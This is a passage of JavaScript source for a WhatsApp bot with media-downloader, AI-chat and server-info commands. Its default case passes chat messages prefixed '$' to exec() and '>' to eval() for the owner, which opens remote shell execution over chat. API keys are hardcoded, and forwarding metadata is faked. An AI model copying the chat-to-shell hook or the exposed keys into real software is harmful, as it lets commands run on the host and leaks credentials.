                            let anu = await fetchJson(`http://15.235.142.199/api/download/facebook?url=${q}&apikey=alpin`)          
                       client.sendMessage(
                   m.chat, 
                {
           video:
    {
       url: 
         anu.result.url
           }, 
             caption: `*Quality* : ${anu.result.quality}`
           }, 
          {quoted:m})
         await client.sendMessage(
           m.chat,
               { 
                  react: 
                     { 
                        text: "☑️",key: m.key,
                           }
                              }
                                )
                              }
                           catch (error) 
                        {
                     await client.sendMessage(
                  m.chat,
               { 
           react:
        { 
    text: `✖️`, key: m.key 
      }
         }
           );
         }   
      }
    break 
    case 'ytmp3': 
    case 'youtubemp3': {
      if (!text) return vinReply('[!] link')
        vinReply('memuat...')
            downloadMp3(text)
        }
    break
    case 'mediafire': {
	    if (args.length == 0) return vinReply(`_[!] Link_`)
	        if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return vinReply(`Link Mungkin Expired!`)
	          vinReply(`_[!] process ${args[0]}_`)
	            await sleep(1200)
	              const mdfl = await mediafireDl(text)
	            if (mdfl[0].size.split('MB')[0] >= 1000) return vinReply('[!] big size')
        client.sendMessage(
           m.chat, 
              { document :
                 { url : 
                    mdfl[0].link
                      }, 
                        fileName : mdfl[0].nama, 
                        mimetype: mdfl[0].mime
                      }, 
                   { 
                 quoted : m 
              }
           )
        }
    break
    case 'instagram':
    case 'ig':
    {
      if (!q) return vinReply('_[!] send link instagram_')
        const respon = await fetchJson(`https://api.arifzyn.tech/download/instagram?url=${q}&apikey=AR-btwbbD1nh8B8`)
            const result = respon.result.media
                  await vinReply('_[!] Download To Url_')
                      await sleep(1200)
                          await client.sendMessage(
                             from,
                                 {
                                   video:
                                       {
                                          url:
                                                result
                                          }, 
                                       caption:
                                   ``
                                 },
                             {
                          quoted:m
                      }
                  )
            }
    break
    case"tiktok":{
      if (!q) return vinReply('[!] send link tiktok')
         const respon = await fetchJson(`https://api.junn4.my.id/download/tiktok?url=${q}`)
           vinReply('[!] Process Download')
             await client.sendMessage(
                  from,
                       {
                            video:
                                 {
                                     url:
                                        respon.result.Medium
                                     }, 
                                 caption:
                            ``
                       },
                  {
             quoted:m
           }
         )
      }
    break
    
// ===================================== //
            //Ai
    case 'ai':
    case 'openai': {
	if (!text) return vinReply(`[!] Quert..?`);   
        let name = client.getName(m.sender);
        try {
            const response = await axios.post("https://deepenglish.com/wp-json/ai-chatbot/v1/chat", {
                messages: [
                    { role: "system", content: `${name}` },
                    { role: "user", content: text }
                ]
            });
            const hasil = response.data;   
            vinReply(hasil.answer);
        } catch (error) {
            console.error("Error:", error);
            return vinReply(error);
        }
    }
    break
// ===================================== //    
    // Info
    case 'speed': case 'ping':{
        const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ 

_Info Server_
⬡-▸ RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
⬡-▸ CPU: ${cpus[0].model.trim()} 
⬡-▸ UPTIME: ${runtime(process.uptime())}

_NodeJS Memory Usaage_
${Object.keys(used)
  .map(
    (key, _, arr) =>
      `${key.padEnd(Math.max(...arr.map((v) => v.length)), " ")}: ${formatp(
        used[key]
      )}`
  )
  .join("\n")}
`.trim();
	await client.sendMessage(
	  from,
	     {
            text: 
              respon, 
                contextInfo:
                   {
                      forwardingScore: 999,
                        isForwarded: true,
                forwardedNewsletterMessageInfo: {
	          newsletterName: "𝑅𝑦𝑧𝑒𝑛 𝑂𝑛 𝑊ℎ𝑎𝑡𝑠𝑎𝑝𝑝 𝐶ℎ𝑎𝑛𝑒𝑙",
		   newsletterJid: "120363236214682540@newsletter",
		 },
      externalAdReply: {  
    title: `${salam}`,
        body: '𝑅𝑦𝑧𝑒𝑛 𝑆𝑐𝑟𝑖𝑝𝑡',
            thumbnailUrl: 'https://telegra.ph/file/25f9ba1e06f29a0f74ecd.jpg',
                sourceUrl: `https://api-alvin.my.id`,
                    mediaType: 1,
                        renderLargerThumbnail: true
                    }
                }
            },
        {
         quoted:
    fcall}
        )
      }
    break
    
   

// ===================================== // 
     case 'pay':{
      client.sendMessage(
        from,
           {
             image: 
                {
                  url: 
                     `https://telegra.ph/file/2f7c92bf9392c996126b5.jpg`
                  }, 
                     caption: ``
                  }, 
                {
             quoted:m
           }
        )
     }
    break/*
       case 'jadibot': {
          JadiBot(client, m, from)
       }
    break */
    case 'owner': 
    case 'creator': {
       client.sendContact(
         from, 
          global.owner, 
            m
          )
       }
    break
// ===================================== //


            default:
                if (body.startsWith('$')){
                   if(!isCreator) return 
                         qur = body.slice(2)
                            exec(qur, (err, stdout) => {
                                 if (err) return vinReply(`${err}`)
                                 if (stdout) {
                           vinReply(stdout)
                         }
                   }
                )
            }
                if (budy.startsWith('>')) {
                    if (!isCreator) return
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await vinReply(evaled)
                    }
                    catch (err) {
                        await vinReply(util.format(err))
                    }
                }
        }

    }
    catch (err) {
        console.log(util.format(err))
let e = String(err)
client.sendMessage(global.owner + "@s.whatsapp.net", { text: "Hi Developer Please Fix\n" + util.format(e), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
    }
}




/*
ᴀʟᴠɪɴ'ꜱ ᴏʀɪɢɪɴᴀʟ ʙᴀꜱᴇ

ʙᴀꜱᴇ ʙʏ ᴀʟᴠɪɴ
ᴄʀᴇᴅɪᴛ ᴀʟᴠɪɴ
ʏᴏᴜᴛᴜʙᴇ @ᴄᴀʟʟᴍᴇᴠɪɴᴢ
ɢɪᴛʜᴜʙ : ᴀʟᴠɪɴᴘɪɴ
ɪɴꜱᴛᴀɢʀᴀᴍ : ᴜɴᴋɴᴏᴘɪɴ 
ᴛᴇʟᴇɢʀᴀᴍ : ᴛ.ᴍᴇ/@ʙɪᴏxꜱᴇʀᴠɪᴄᴇ

ʙᴜʏ ʀʏᴢᴇɴ ᴡɪᴛʜ ʜᴀᴄᴋɪɴɢ ᴛᴏᴏʟꜱ ᴀɴᴅ ᴘʏᴛʜᴏɴ ᴘʀᴏɢʀᴀᴍᴍɪɴɢ ʟᴀɴɢᴜᴀɢᴇ 
            ⇓
ᴘᴠ = ᴛ.ᴍᴇ/@ʙɪᴏxꜱᴇʀᴠɪᴄᴇ

ɴᴏᴛᴇꜱ
ᴅᴇʟᴇᴛɪɴɢ ᴄʀᴇᴅɪᴛ ᴛʜᴇʀᴇ ᴡɪʟʟ ʙᴇ ɴᴏ ᴜᴘᴅᴀᴛᴇꜱ
*/